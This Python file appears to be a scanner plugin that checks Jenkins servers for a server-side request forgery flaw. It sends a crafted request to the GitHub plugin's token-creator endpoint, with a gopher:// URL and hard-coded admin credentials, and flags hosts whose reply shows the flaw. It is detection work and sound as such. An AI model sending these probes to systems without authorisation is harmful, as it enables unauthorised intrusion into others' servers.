#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    target = ('{}://{}:{}/securityRealm/user/admin/descriptorByName/'
              'org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/'
              'createTokenByPassword?apiUrl=gopher://www.example.com/%23&login=admin'
              '&password=tsai').format(service, ip, port)
    try:
        r = await http_client(ip, port).get(target, headers={"User-Agent": GLOBAL_USER_AGENT}, timeout=20)
        if r.text.find('create GH token for admin - unknown protocol: gopher') > 0:
            ret = {
                'alert_group': 'Jenkins SSRF',
                'affects': '{}://{}:{}'.format(service, ip, port),
                'details': target.replace('gopher', 'http')
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8080, 'http', True, {})
    run_plugin_test(scan)
